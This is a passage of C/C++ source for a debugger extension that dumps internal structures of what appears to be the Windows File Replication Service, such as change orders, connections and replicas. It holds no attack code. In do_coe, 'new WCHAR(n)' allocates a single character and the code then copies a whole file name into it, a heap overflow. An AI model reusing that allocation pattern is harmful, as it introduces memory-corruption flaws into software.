    p = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytes);
    return (p);
}


void __cdecl
::operator delete (void *p)
{
    HeapFree(GetProcessHeap(), 0, p);
}

BOOL
GetData(IN ULONG_PTR dwAddress,  IN LPVOID ptr, IN ULONG size, IN PCSTR type )
{
    BOOL b;
    ULONG BytesRead;
    ULONG count;

    if (fKD == 0)
        {
        return ReadProcessMemory(ProcessHandle, (LPVOID) dwAddress, ptr, size, 0);
        }

    while( size > 0 )
        {
        count = MIN( size, 3000 );

        b = ReadMemory((ULONG) dwAddress, ptr, count, &BytesRead );

        if (!b || BytesRead != count )
            {
            if (NULL == type)
                {
                type = "unspecified" ;
                }
            return FALSE;
            }

        dwAddress += count;
        size -= count;
        ptr = (LPVOID)((ULONG_PTR)ptr + count);
        }

    return TRUE;
}

char *Days[] =
{
    "Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"
};

char *Months[] =
{
    "Jan", "Feb", "Mar", "Apr", "May", "Jun",
    "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
};

VOID
FileTimeToString(
    FILETIME *FileTime,
    PCHAR     Buffer
    )
/*++

Routine Description:

    Convert a FileTime (UTC time) to an ANSI date/time string in the
    local time zone.

Arguments:

    Time - ptr to a FILETIME
    Str  - a string of at least TIME_STRING_LENGTH bytes to receive the time.

Return Value:

    None

--*/
{

    FILETIME LocalFileTime;
    SYSTEMTIME SystemTime;

    Buffer[0] = '\0';
    strcpy(Buffer, "Time???");
    if (FileTime->dwHighDateTime != 0 || FileTime->dwLowDateTime != 0)
    {
        if (!FileTimeToLocalFileTime(FileTime, &LocalFileTime) ||
            !FileTimeToSystemTime(&LocalFileTime, &SystemTime))
        {
            return;
        }
        sprintf(
            Buffer,
            "%s %s %2d, %4d %02d:%02d:%02d",
            Days[SystemTime.wDayOfWeek],
            Months[SystemTime.wMonth - 1],
            SystemTime.wDay,
            SystemTime.wYear,
            SystemTime.wHour,
            SystemTime.wMinute,
            SystemTime.wSecond);
    }
    return;
}

#define DMPGUID(_TEXT_,_Guid_)            \
        {                                  \
            dprintf((_TEXT_));             \
            dprintf("%08x-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x\n",   \
                   (_Guid_).Data1,                          \
                   (_Guid_).Data2,                          \
                   (_Guid_).Data3,                          \
                   (_Guid_).Data4[0],                       \
                   (_Guid_).Data4[1],                       \
                   (_Guid_).Data4[2],                       \
                   (_Guid_).Data4[3],                       \
                   (_Guid_).Data4[4],                       \
                   (_Guid_).Data4[5],                       \
                   (_Guid_).Data4[6],                       \
                   (_Guid_).Data4[7]);                      \
        }

#define DMPPGUID(_TEXT_,_pGuid_)            \
        {                                  \
            BOOL bDmpGuid;                 \
            BYTE bufDmpGuid[sizeof(GUID)]; \
            dprintf((_TEXT_));             \
            bDmpGuid = GetData((ULONG)(_pGuid_), &bufDmpGuid, sizeof(bufDmpGuid), NULL);\
            if ( !bDmpGuid ) {                                                 \
                dprintf("<Error reading memory>\n");                             \
            } else {                                                           \
                dprintf("%08x-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x\n",   \
                       ((GUID *)(bufDmpGuid))->Data1,                          \
                       ((GUID *)(bufDmpGuid))->Data2,                          \
                       ((GUID *)(bufDmpGuid))->Data3,                          \
                       ((GUID *)(bufDmpGuid))->Data4[0],                       \
                       ((GUID *)(bufDmpGuid))->Data4[1],                       \
                       ((GUID *)(bufDmpGuid))->Data4[2],                       \
                       ((GUID *)(bufDmpGuid))->Data4[3],                       \
                       ((GUID *)(bufDmpGuid))->Data4[4],                       \
                       ((GUID *)(bufDmpGuid))->Data4[5],                       \
                       ((GUID *)(bufDmpGuid))->Data4[6],                       \
                       ((GUID *)(bufDmpGuid))->Data4[7]);                      \
                                                                               \
            }                                                                  \
        }

#define DMPGNAME(_TEXT_,_pGname_)               \
        {                                       \
            BOOL     bDmpGname;                 \
            BYTE     bufDmpGname[sizeof(GNAME)];\
            BYTE     DmpName[MAX_PATH * 2];         \
            UINT     count = 0;                 \
            bDmpGname = GetData((ULONG)(_pGname_), &bufDmpGname, sizeof(bufDmpGname), NULL);\
            if ( !bDmpGname ) {                                                             \
                dprintf((_TEXT_));                                                          \
                dprintf("<Error reading memory>\n");                                        \
            } else {                                                                        \
                DMPPGUID((_TEXT_),((GNAME *)bufDmpGname)->Guid);                             \
                dprintf((_TEXT_));                                                          \
                if (((GNAME *)bufDmpGname)->Name == NULL) {                                 \
                    dprintf("<null>\n");                                                    \
                } else {                                                                    \
                    while (count < MAX_PATH * 2 && bDmpGname) {                             \
                        bDmpGname = GetData((ULONG)(((GNAME *)bufDmpGname)->Name) + count, &DmpName[count], sizeof(BYTE), NULL);\
                        count++;                                                            \
                    }                                                                       \
                                                                                            \
                    dprintf("%ws\n",(WCHAR *)DmpName);                                      \
                }                                                                           \
            }                                                                               \
        }

#define DMPQUAD(_TEXT_,_Fid_)                                               \
        {                                                                   \
            dprintf((_TEXT_));                                              \
            dprintf("%08x %08x\n",(ULONG)((_Fid_)>>32) ,(ULONG)(_Fid_));    \
        }

#define DMPTIME(_TEXT_,_Time_)                                              \
        {                                                                   \
            CHAR TimeStr[TIME_STRING_LENGTH];                               \
            FileTimeToString((FILETIME *)&(_Time_),TimeStr);                \
            dprintf((_TEXT_));                                              \
            dprintf("%s\n",TimeStr);                                        \
        }

#define DMPSTRW(_TEXT_,_pStr_)                                              \
        {                                                                   \
            UINT count = 0;                                                 \
            BOOL bDmpStrW = TRUE;                                           \
            BYTE DmpStr[MAX_PATH * 2];                                      \
            while (count < MAX_PATH * 2 && bDmpStrW) {                      \
                bDmpStrW = GetData((ULONG)(_pStr_) + count, &DmpStr[count], sizeof(BYTE), NULL);\
                count++;                                                    \
            }                                                               \
            dprintf((_TEXT_));                                              \
            dprintf("%ws\n",(WCHAR *)DmpStr);                               \
        }
//
// Common print functions for all the data structures.
//

VOID
do_coe(
    PCHANGE_ORDER_ENTRY ChangeOrder
    )
/*
typedef struct _CHANGE_ORDER_ENTRY_ {
    GENERIC_HASH_ENTRY_HEADER  HashEntryHeader;   // Change Order hash Table support

    UNICODE_STRING   UFileName;           // Used in renames to make file name bigger
    ULONG            EntryFlags;          // misc state flags. See below.
    ULONG            CoMorphGenCount;     // for debugging.
    //
    // Change order process list management.
    //
    LIST_ENTRY        ProcessList;        // Link on the change order process list.
    ULONG             TimeToRun;          // Time to process the change order.
    ULONG             EntryCreateTime;    // Tick Count at entry create time.
    SINGLE_LIST_ENTRY DupCoList;          // Duplicate change order list.
    //
    //
    ULONG     DirNestingLevel;            // Number levels file is down in tree.
    ULONGLONG FileReferenceNumber;        // File's FID
    ULONGLONG ParentFileReferenceNumber;  // File's parent FID

    ULONGLONG OriginalParentFid;          // For rename processing
    ULONGLONG NewParentFid;               // For rename processing
    ULONGLONG NameConflictHashValue;      // Key value for NameConflict table cleanup.

    ULONG     StreamLastMergeSeqNum;      // Stream seq num of last Usn record merged with this CO.
    PREPLICA_THREAD_CTX  RtCtx;           // For DB access during CO processing.
    GUID                *pParentGuid;     // ptr to the File's parent Guid in CoCmd.
    //
    // The joinguid is a cxtion's session id and, in this case,
    // is used to retry change orders that were accepted by
    // the change order accept thread for a cxtion that has since
    // unjoined from its partner. The change orders for previous
    // sessions are retried because they are out-of-order wrt the
    // change orders for the current session id. In other words,
    // order is maintained per session by coordinating the partners
    // at join time.
    GUID                JoinGuid;         // Cxtion's session id
                                          // undefined if local co

    //
    // Remote and control change orders are associated with a cxtion.
    // If this field is non-null, then the field
    // ChangeOrderCount has been incremente for this change
    // order. The count should be decremented when the
    // change order is freed in ChgOrdIssueCleanup().
    //
    PCXTION             Cxtion;           // NULL if local co
    //
    // Issue cleanup flags -- As a change order is processed it acquires
    // various resources that must be released when it retires or goes thru
    // retry.  The ISCU flag bits below are used to set these bits.  Note:
    // Not all bits may be set here.  Some may get set just before the CO goes
    // thru cleanup.
    //
    ULONG               IssueCleanup;

    //
    // Needed to dampen basic info changes (e.g., resetting the archive bit)
    // Copied from the idtable entry when the change order is created and
    // used to update the change order when the change order is retired.
    //
    ULONG           FileAttributes;
    LARGE_INTEGER   FileCreateTime;
    LARGE_INTEGER   FileWriteTime;

    //
    // Change order command parameters.
    // (must be last since it ends with FileName)
    //
    CHANGE_ORDER_COMMAND Cmd;

} CHANGE_ORDER_ENTRY, *PCHANGE_ORDER_ENTRY;

*/
{
    PWCHAR           FileName    = NULL;

    dprintf("Dumping  CHANGE_ORDER_ENTRY.\n\n");
    dprintf("HashEntryHeader           : Address( 0x%x )\n",ChangeOrder->HashEntryHeader);

    dprintf("FileNameLength            : %d\n",ChangeOrder->UFileName.Length);

    FileName = new WCHAR((ChangeOrder->UFileName.Length)/2 + 1);

    GetData((ULONG)(ChangeOrder->UFileName.Buffer),(BYTE*)FileName,ChangeOrder->UFileName.Length,NULL);
    FileName[(ChangeOrder->UFileName.Length)/2] = L'\0';

    dprintf("FileName                  : Address( 0x%x )\n",ChangeOrder->UFileName.Buffer);
    dprintf("FileName                  : %ws\n",FileName);
    delete FileName;
    dprintf("EntryFlags                : 0x%x\n",ChangeOrder->EntryFlags);
    dprintf("CoMorphGenCount           : %d\n",ChangeOrder->CoMorphGenCount);
    dprintf("ProcessList               : Address( 0x%x )\n",ChangeOrder->ProcessList);
    dprintf("TimeToRun                 : %d\n",ChangeOrder->TimeToRun);
    dprintf("EntryCreateTime           : %d\n",ChangeOrder->EntryCreateTime);
    dprintf("DupCoList                 : Address( 0x%x )\n",ChangeOrder->DupCoList);
    dprintf("DirNestingLevel           : %d\n",ChangeOrder->DirNestingLevel);
    DMPQUAD("FileReferenceNumber       : ",ChangeOrder->FileReferenceNumber);
    DMPQUAD("ParentFileReferenceNumber : ",ChangeOrder->ParentFileReferenceNumber);
    DMPQUAD("OriginalParentFid         : ",ChangeOrder->OriginalParentFid);
    DMPQUAD("NewParentFid              : ",ChangeOrder->NewParentFid);
    DMPQUAD("NameConflictHashValue     : ",ChangeOrder->NameConflictHashValue);
    dprintf("StreamLastMergeSeqNum     : %d\n",ChangeOrder->StreamLastMergeSeqNum);
    dprintf("RtCtx                     : Address( 0x%x )\n",ChangeOrder->RtCtx);
    DMPPGUID("pParentGuid               : ",ChangeOrder->pParentGuid);
    DMPGUID("JoinGuid                  : ",ChangeOrder->JoinGuid);
    dprintf("Cxtion                    : Address( 0x%x )\n",ChangeOrder->Cxtion);
    dprintf("IssueCleanup              : 0x%x\n",ChangeOrder->IssueCleanup);
    dprintf("FileAttributes            : 0x%x\n",ChangeOrder->FileAttributes);
    DMPTIME("FileCreateTime            : ",ChangeOrder->FileCreateTime);
    DMPTIME("FileWriteTime             : ",ChangeOrder->FileWriteTime);
    dprintf("Cmd                       : Address( 0x%x )\n",ChangeOrder->Cmd);
}

VOID
do_coc(
    PCHANGE_ORDER_COMMAND Cmd
    )
/*
typedef struct _CHANGE_ORDER_RECORD_ {
    ULONG     SequenceNumber;        // Unique sequence number for change order.
    ULONG     Flags;                 // Change order flags
    ULONG     IFlags;                // These flags can ONLY be updated with interlocked exchange.
    ULONG     State;                 // State is sep DWORD to avoid locking.
    ULONG     ContentCmd;            // File content changes from UsnReason

    union {
        ULONG           LocationCmd;
        CO_LOCATION_CMD Field;       // File Location command
    } Lcmd;

    ULONG     FileAttributes;
    ULONG     FileVersionNumber;     // The file version number, inc on each close.
    ULONG     PartnerAckSeqNumber;   // Save seq number for Partner Ack.

    ULONGLONG FileSize;
    ULONGLONG FileOffset;            // The current committed progress for staging file.
    ULONGLONG FrsVsn;                // Originator Volume sequence number
    bugbug("perf: FileUsn and JrnlUsn can probably be combined")
    USN       FileUsn;               // The USN of the file must match on the Fetch request.
    USN       JrnlUsn;               // USN of last journal record contributing to this CO.
    USN       JrnlFirstUsn;          // USN of first journal record contributing to this CO.

    struct _REPLICA *OriginalReplica; // Contains Replica ID when in DB
    struct _REPLICA *NewReplica;      // Contains Replica ID when in DB

    GUID      ChangeOrderGuid;       // Guid that identifies the change order everywhere.
    GUID      OriginatorGuid;        // The GUID of the originating member
    GUID      FileGuid;              // The obj ID of the file
    GUID      OldParentGuid;         // The Obj ID of the file's original parent directory
    GUID      NewParentGuid;         // The Obj ID of the file's current parent directory
    GUID      CxtionGuid;            // The obj ID of remote CO connection.

    ULONGLONG Spare1Ull;
    ULONGLONG Spare2Ull;
    GUID      Spare1Guid;
    GUID      Spare2Guid;
    PWCHAR    Spare1Wcs;
    PWCHAR    Spare2Wcs;
    PVOID     Spare1Bin;
    PVOID     Spare2Bin;

    LARGE_INTEGER EventTime;         // The USN Journal Entry Timestamp.
    USHORT    FileNameLength;
    WCHAR     FileName[MAX_PATH+1];  // The file name. (Must be Last)

} CHANGE_ORDER_COMMAND, *PCHANGE_ORDER_COMMAND,
*/
{
    PWCHAR           FileName    = NULL;

    dprintf("Dumping  CHANGE_ORDER_COMMAND.\n\n");
    dprintf("SequenceNumber            : %d\n",Cmd->SequenceNumber);
    dprintf("Flags                     : 0x%x\n",Cmd->Flags);
    dprintf("IFlags                    : 0x%x\n",Cmd->IFlags);
    dprintf("State                     : %d\n",Cmd->State);
    dprintf("ContentCmd                : 0x%x\n",Cmd->ContentCmd);
    dprintf("LocationCmd               : 0x%x\n",Cmd->Lcmd.LocationCmd);
    dprintf("FileAttributes            : 0x%x\n",Cmd->FileAttributes);
    dprintf("FileVersionNumber         : %d\n",Cmd->FileVersionNumber);
    dprintf("PartnerAckSeqNumber       : %d\n",Cmd->PartnerAckSeqNumber);
    DMPQUAD("FileSize                  : ",Cmd->FileSize);
    DMPQUAD("FileOffset                : ",Cmd->FileOffset);
    DMPQUAD("FrsVsn                    : ",Cmd->FrsVsn);
    DMPQUAD("FileUsn                   : ",Cmd->FileUsn);
    DMPQUAD("JrnlUsn                   : ",Cmd->JrnlUsn);
    DMPQUAD("JrnlFirstUsn              : ",Cmd->JrnlFirstUsn);
    dprintf("OriginalReplicaNum        : %d\n",Cmd->OriginalReplicaNum);
    dprintf("NewReplicaNum             : %d\n",Cmd->NewReplicaNum);
    DMPGUID("ChangeOrderGuid           : ",Cmd->ChangeOrderGuid);
    DMPGUID("OriginatorGuid            : ",Cmd->OriginatorGuid);
    DMPGUID("FileGuid                  : ",Cmd->FileGuid);
    DMPGUID("OldParentGuid             : ",Cmd->OldParentGuid);
    DMPGUID("NewParentGuid             : ",Cmd->NewParentGuid);
    DMPGUID("CxtionGuid                : ",Cmd->CxtionGuid);
    DMPTIME("EventTime                 : ",Cmd->EventTime);
    dprintf("FileNameLength            : %d\n",Cmd->FileNameLength);
    dprintf("FileName                  : %ws\n",Cmd->FileName);
}

VOID
do_cxt(
    PCXTION pCxtion
    )
/*
typedef struct _CXTION  CXTION, *PCXTION;
struct _CXTION {
    FRS_NODE_HEADER Header;     // memory management
    ULONG           State;      // Incore state
    ULONG           Flags;      // misc flags
    BOOL            Inbound;    // TRUE if inbound cxtion        *
    BOOL            JrnlCxtion; // TRUE if this Cxtion struct is for the local NTFS Journal
    PGNAME          Name;       // Cxtion name/guid from the DS  *
    PGNAME          Partner;    // Partner's name/guid from the DS    *
    PWCHAR          PartnerDnsName;     // partner's DNS name from the DS *
    PWCHAR          PartnerPrincName;   // partner's server principle name *
    PWCHAR          PartnerSid;         // partner's sid (string) *
    PWCHAR          PartSrvName;        // Partner's server name
    ULONG           PartnerAuthLevel;   // Authentication level  *
    PGEN_TABLE      VVector;            // partner's version vector
    PSCHEDULE       Schedule;           // schedule                      *
    ULONG           TerminationCoSeqNum;// The Seq Num of most recent Termination CO inserted.
    PCOMMAND_SERVER VvJoinCs;           // command server for vvjoins
    struct _COMMAND_PACKET  *JoinCmd;   // check join status; rejoin if needed
                                        // NULL == no delayed cmd outstanding
    ULONGLONG       LastJoinTime;       // The time of the last successful join on this cxtion.
    GUID            JoinGuid;           // Unique id for this join
    GUID            ReplicaVersionGuid; // partner's originator guid
    DWORD           CommQueueIndex;     // Comm layer queue for sending pkts
    DWORD           ChangeOrderCount;   // remote/control change orders pending
    PGEN_TABLE      CoeTable;           // table of idle change orders
    struct _COMMAND_PACKET *CommTimeoutCmd; // Timeout (waitable timer) packet
    DWORD           UnjoinTrigger;      // DBG force unjoin in # remote cos
    DWORD           UnjoinReset;        // reset force unjoin trigger
    PFRS_QUEUE      CoProcessQueue;     // If non-null then Unidle the queue when
                                        // JOIN succeeds or fails.
    ULONG           CommPkts;           // Number of comm pkts
    ULONG           Penalty;            // Penalty in Milliseconds
    PCOMM_PACKET    ActiveJoinCommPkt;  // Don't flood Q w/many join pkts
    ULONG           PartnerMajor;       // From comm packet
    ULONG           PartnerMinor;       // From comm packet
    struct _OUT_LOG_PARTNER_ *OLCtx;    // Outbound Log Context for this connection.

    struct _HASHTABLEDATA_REPLICACONN *PerfRepConnData; // PERFMON counter data structure
};
*/
{
    dprintf("Dumping  CXTION.\n\n");
    dprintf("Header                    : Address ( 0x%x )\n",pCxtion->Header);
    dprintf("State                     : %d\n",pCxtion->State);
    dprintf("Flags                     : 0x%x\n",pCxtion->Flags);
    dprintf("Inbound                   : %d\n",pCxtion->Inbound);
    dprintf("JrnlCxtion                : %d\n",pCxtion->JrnlCxtion);
    DMPGNAME("Name                      : ",pCxtion->Name);
    DMPGNAME("Partner                   : ",pCxtion->Partner);
    dprintf("PartnerDnsName            : %ws\n",pCxtion->PartnerDnsName);
    dprintf("PartnerPrincName          : %ws\n",pCxtion->PartnerPrincName);
    dprintf("PartnerSid                : %ws\n",pCxtion->PartnerSid);
    dprintf("PartSrvName               : %ws\n",pCxtion->PartSrvName);
    dprintf("PartnerAuthLevel          : %d\n",pCxtion->PartnerAuthLevel);
    dprintf("VVector                   : Address ( 0x%x )\n",pCxtion->VVector);
    dprintf("Schedule                  : Address ( 0x%x )\n",pCxtion->Schedule);
    dprintf("TerminationCoSeqNum       : %d\n",pCxtion->TerminationCoSeqNum);
    dprintf("VvJoinCs                  : Address ( 0x%x )\n",pCxtion->VvJoinCs);
    dprintf("JoinCmd                   : Address ( 0x%x )\n",pCxtion->JoinCmd);
    DMPTIME("LastJoinTime              : ",pCxtion->LastJoinTime);
    DMPGUID("JoinGuid                  : ",pCxtion->JoinGuid);
    DMPGUID("ReplicaVersionGuid        : ",pCxtion->ReplicaVersionGuid);
    dprintf("CommQueueIndex            : %d\n",pCxtion->CommQueueIndex);
    dprintf("ChangeOrderCount          : %d\n",pCxtion->ChangeOrderCount);
    dprintf("CoeTable                  : Address ( 0x%x )\n",pCxtion->CoeTable);
    dprintf("CommTimeoutCmd            : Address ( 0x%x )\n",pCxtion->CommTimeoutCmd);
    dprintf("UnjoinTrigger             : %d\n",pCxtion->UnjoinTrigger);
    dprintf("UnjoinReset               : %d\n",pCxtion->UnjoinReset);
    dprintf("CoProcessQueue            : Address ( 0x%x )\n",pCxtion->CoProcessQueue);
    dprintf("CommPkts                  : %d\n",pCxtion->CommPkts);
    dprintf("Penalty                   : %d\n",pCxtion->Penalty);
    dprintf("ActiveJoinCommPkt         : Address ( 0x%x )\n",pCxtion->ActiveJoinCommPkt);
    dprintf("PartnerMajor              : %d\n",pCxtion->PartnerMajor);
    dprintf("PartnerMinor              : %d\n",pCxtion->PartnerMinor);
    dprintf("OLCtx                     : Address ( 0x%x )\n",pCxtion->OLCtx);
    dprintf("PerfRepConnData           : Address ( 0x%x )\n",pCxtion->PerfRepConnData);
}

VOID
do_olp(
    POUT_LOG_PARTNER pOlp
    )
/*
typedef struct _OUT_LOG_PARTNER_ {
    FRS_NODE_HEADER  Header;    // Memory alloc
    LIST_ENTRY List;            // Link on the change order set list. (DONT MOVE)

    ULONG    Flags;             // misc state flags.  see below.
    ULONG    State;             // Current state of this outbound partner.
    SINGLE_LIST_ENTRY SaveList; // The link for the DB save list.
    ULONG    COLxRestart;       // Restart point for Leading change order index.
    ULONG    COLxVVJoinDone;    // COLx where VVJoin Finished and was rolled back.
    ULONG    COLx;              // Leading change order index / sequence number.
    ULONG    COTx;              // Trailing change order index / sequence number.
    ULONG    COTxLastSaved;     // COTx value last saved in DB.
    ULONG    COTxNormalModeSave;// Saved Normal Mode COTx while in VV Join Mode.
    ULONG    COTslot;           // Slot in Ack Vector corresponding to COTx.
    ULONG    OutstandingCos;    // The current number of change orders outstanding.
    ULONG    OutstandingQuota;  // The maximum number of COs outstanding.

    ULONG    AckVector[ACK_VECTOR_LONGS];  // The partner ack vector.

    PCXTION  Cxtion;            // The partner connection.  Has Guid and VVector.

} OUT_LOG_PARTNER, *POUT_LOG_PARTNER;
*/
{
    dprintf("Dumping OUT_LOG_PARTNER.\n\n");
    dprintf("Header                    : Address ( 0x%x )\n",pOlp->Header);
    dprintf("List                      : Address ( 0x%x )\n",pOlp->List);
    dprintf("Flags                     : 0x%x\n",pOlp->Flags);
    dprintf("State                     : %d\n",pOlp->State);
    dprintf("SaveList                  : Address ( 0x%x )\n",pOlp->SaveList);
    dprintf("COLxRestart               : %d\n",pOlp->COLxRestart);
    dprintf("COLxVVJoinDone            : %d\n",pOlp->COLxVVJoinDone);
    dprintf("COLx                      : %d\n",pOlp->COLx);
    dprintf("COTx                      : %d\n",pOlp->COTx);
    dprintf("COTxLastSaved             : %d\n",pOlp->COTxLastSaved);
    dprintf("COTxNormalModeSave        : %d\n",pOlp->COTxNormalModeSave);
    dprintf("COTslot                   : %d\n",pOlp->COTslot);
    dprintf("OutstandingCos            : %d\n",pOlp->OutstandingCos);
    dprintf("OutstandingQuota          : %d\n",pOlp->OutstandingQuota);
}

VOID
do_rep(
    PREPLICA pReplica
    )
/*
typedef struct _REPLICA {
    FRS_NODE_HEADER     Header;           // memory management
    CRITICAL_SECTION    ReplicaLock;      // protects filter list (for now)
    ULONG               ReferenceCount;
    ULONG               CnfFlags;         // From the config record
    ULONG               ReplicaSetType;   // Type of replica set
    BOOL                Consistent;       // replica is consistent
    BOOL                IsOpen;           // database table is open
    BOOL                IsJournaling;     // journal has been started
    BOOL                IsAccepting;      // accepting comm requests
    BOOL                NeedsUpdate;      // needs updating in the database
    BOOL                IsSeeding;        // Seeding thread is deployed
    BOOL                IsSysvolReady;    // SysvolReady is set to 1
    LIST_ENTRY          ReplicaList;      // Link all replicas together
    ULONG               ServiceState;     // stop, started, ...
    FRS_ERROR_CODE      FStatus;          // error
    PFRS_QUEUE          Queue;            // controlled by the command server
    PGNAME              ReplicaName;      // Set name/Server guid from the DS
    ULONG               ReplicaNumber;    // Internal id (name)
    PGNAME              MemberName;       // Member name/guid from the DS
    PGNAME              SetName;          // Set/guid name from the DS
    GUID                *ReplicaRootGuid; // guid assigned to Root dir
    GUID                ReplicaVersionGuid; // originator guid for version vector
    PSCHEDULE           Schedule;         // schedule
    PGEN_TABLE          VVector;          // Version vector
    PGEN_TABLE          Cxtions;          // in/outbound cxtions
    PWCHAR              Root;             // Root path
    PWCHAR              Stage;            // Staging path
    PWCHAR              NewStage;         // This maps to the current staging path in the
                                          // DS. NewStage will be the one written to
                                          // the config record but Stage will be used until
                                          // next reboot.
    PWCHAR              Volume;           // Volume??? bugbug
    ULONGLONG           MembershipExpires;// membership tombstone
    ULONGLONG           PreInstallFid;    // For journal filtering.
    TABLE_CTX           ConfigTable;      // Db table context
    FRS_LIST            ReplicaCtxListHead; // Links all open contexts on this replica set.
    PWCHAR              FileFilterList;     // Raw file filter
    PWCHAR              DirFilterList;      // Raw directory filter
    LIST_ENTRY          FileNameFilterHead; // Head of file name filter list.
    LIST_ENTRY          DirNameFilterHead;  // Head of directory name filter list.
    PQHASH_TABLE        NameConflictTable;  // Sequence COs using the same file name.

    LONG                InLogRetryCount;  // Count of number CO needing a Retry.
    ULONG               InLogSeqNumber;   // The last sequence number used in Inlog
    //
    //
    // The inlog retry table tracks which retry change orders are currently
    // active so we don't reissue the same change order until current
    // invocation completes.  This can happen when the system gets backed up
    // and the change order retry thread kicks off again to issue retry COs
    // before the last batch are able to finish.  This state could be kept in
    // the Inlog record but then it means extra writes to the DB.
    // The sequence number is used to detect changes in the table when we don't
    // have the lock.  It is per-replica because it uses the change order
    // sequence number of the inlog record and they aren't unique across
    // replicas.
    //
    PQHASH_TABLE        ActiveInlogRetryTable;
    union {
        struct {
            ULONG       AIRSequenceNum;
            ULONG       AIRSequenceNumSample;
        };
        ULONGLONG QuadChunkA;
    };

    //
    // Status of sysvol seeding.
    // Returned for NtFrsApi_Rpc_PromotionStatusW().
    //
    DWORD               NtFrsApi_ServiceState;
    DWORD               NtFrsApi_ServiceWStatus;
#ifndef NOVVJOINHACK
    DWORD               NtFrsApi_HackCount;         // temporary hack
#endif NOVVJOINHACK
    PWCHAR              NtFrsApi_ServiceDisplay;

    //
    // The Outbound log process state for this replica.
    //
    CRITICAL_SECTION    OutLogLock;       // protects the OutLog state
    LIST_ENTRY          OutLogEligible;   // Eligible outbound log partners
    LIST_ENTRY          OutLogStandBy;    // Partners ready to join eligible list
    LIST_ENTRY          OutLogActive;     // Active outbound log partners
    LIST_ENTRY          OutLogInActive;   // Inactive outbound log partners

    PQHASH_TABLE        OutLogRecordLock; // Sync access to outlog records.
    ULONG               OutLogSeqNumber;  // The last sequence number used in Outlog
    ULONG               OutLogJLx;        // The Joint Leading Index
    ULONG               OutLogJTx;        // The Joint Trailing Index
    ULONG               OutLogCOMax;      // The index of the Max change order in the log.
    ULONG               OutLogWorkState;  // The output log current processing state.
    struct _COMMAND_PACKET *OutLogCmdPkt; // Cmd pkt to queue when idle and have work.
    PTABLE_CTX          OutLogTableCtx;   // Output Log Table context.
    ULONG               OutLogCountVVJoins; // Count of number of VVJoins in progress.
    BOOL                OutLogDoCleanup;  // True means give log cleanup a run.

    //
    // The handle to the preinstall directory
    //
    HANDLE              PreInstallHandle;

    //
    // The volume journal state for this replica.
    //
    GUID                JrnlCxtionGuid;    // Used as the Cxtion Guid for Local Cos
    USN                 InlogCommitUsn;    // Our current USN Journal commit point.
    //USN                 JournalUsn;      // The Journal USN for this replica.
    USN                 JrnlRecoveryStart; // Point to start recovery.
    USN                 JrnlRecoveryEnd;   // Point where recovery is complete.
    LIST_ENTRY          RecoveryRefreshList; // List of file refresh req change orders.
    LIST_ENTRY          VolReplicaList;    // Links all REPLICA structs on volume together.
    USN                 LastUsnRecordProcessed; // Current Journal subsystem read USN.
    LONG                LocalCoQueueCount; // Count of number local COs in process queue

    struct _VOLUME_MONITOR_ENTRY  *pVme;  // Ref to the VME for this Replica.
    struct _HASHTABLEDATA_REPLICASET *PerfRepSetData;  // PERFMON counter data structure
} REPLICA, *PREPLICA;
*/
{
    dprintf("Dumping REPLICA.\n\n");
    dprintf("Header                    : Address ( 0x%x )\n",pReplica->Header);
    dprintf("ReplicaLock               : Address ( 0x%x )\n",pReplica->ReplicaLock);
    dprintf("ReferenceCount            : %d\n",pReplica->ReferenceCount);
    dprintf("CnfFlags                  : 0x%x\n",pReplica->CnfFlags);
    dprintf("ReplicaSetType            : %d\n",pReplica->ReplicaSetType);
    dprintf("Consistent                : %d\n",pReplica->Consistent);
    dprintf("IsOpen                    : %d\n",pReplica->IsOpen);
    dprintf("IsJournaling              : %d\n",pReplica->IsJournaling);
    dprintf("IsAccepting               : %d\n",pReplica->IsAccepting);
    dprintf("NeedsUpdate               : %d\n",pReplica->NeedsUpdate);
    dprintf("IsSeeding                 : %d\n",pReplica->IsSeeding);
    dprintf("IsSysvolReady             : %d\n",pReplica->IsSysvolReady);
    dprintf("ReplicaList               : Address ( 0x%x )\n",pReplica->ReplicaList);
    dprintf("ServiceState              : %d\n",pReplica->ServiceState);
    dprintf("FStatus                   : %d\n",pReplica->FStatus);
    dprintf("Queue                     : Address ( 0x%x )\n",pReplica->Queue);
    DMPGNAME("ReplicaName               : ",pReplica->ReplicaName);
    dprintf("ReplicaNumber             : %d\n",pReplica->ReplicaNumber);
    DMPGNAME("MemberName                : ",pReplica->MemberName);
    DMPGNAME("SetName                   : ",pReplica->SetName);
    DMPPGUID("ReplicaRootGuid           : ",pReplica->ReplicaRootGuid);
    DMPGUID("ReplicaVersionGuid        : ",pReplica->ReplicaVersionGuid);
    dprintf("Schedule                  : Address ( 0x%x )\n",pReplica->Schedule);
    dprintf("VVector                   : Address ( 0x%x )\n",pReplica->VVector);
    dprintf("Cxtions                   : Address ( 0x%x )\n",pReplica->Cxtions);
    DMPSTRW("Root                      : ",pReplica->Root);
    DMPSTRW("Stage                     : ",pReplica->Stage);
    DMPSTRW("NewStage                  : ",pReplica->NewStage);
    DMPSTRW("Volume                    : ",pReplica->Volume);
    DMPTIME("MembershipExpires         : ",pReplica->MembershipExpires);
    DMPQUAD("PreInstallFid             : ",pReplica->PreInstallFid);
    dprintf("ConfigTable               : Address ( 0x%x )\n",pReplica->ConfigTable);
    dprintf("ReplicaCtxListHead        : Address ( 0x%x )\n",pReplica->ReplicaCtxListHead);
    DMPSTRW("FileFilterList            : ",pReplica->FileFilterList);
    DMPSTRW("DirFilterList             : ",pReplica->DirFilterList);
    dprintf("FileNameFilterHead        : Address ( 0x%x )\n",pReplica->FileNameFilterHead);
    dprintf("DirNameFilterHead         : Address ( 0x%x )\n",pReplica->DirNameFilterHead);
    dprintf("NameConflictTable         : Address ( 0x%x )\n",pReplica->NameConflictTable);
    dprintf("InLogRetryCount           : %d\n",pReplica->InLogRetryCount);
    dprintf("InLogSeqNumber            : %d\n",pReplica->InLogSeqNumber);
    dprintf("ActiveInlogRetryTable     : Address ( 0x%x )\n",pReplica->ActiveInlogRetryTable);
    dprintf("NtFrsApi_ServiceState     : %d\n",pReplica->NtFrsApi_ServiceState);
    dprintf("NtFrsApi_ServiceWStatus   : %d\n",pReplica->NtFrsApi_ServiceWStatus);
    DMPSTRW("NtFrsApi_ServiceDisplay   : ",pReplica->NtFrsApi_ServiceDisplay);
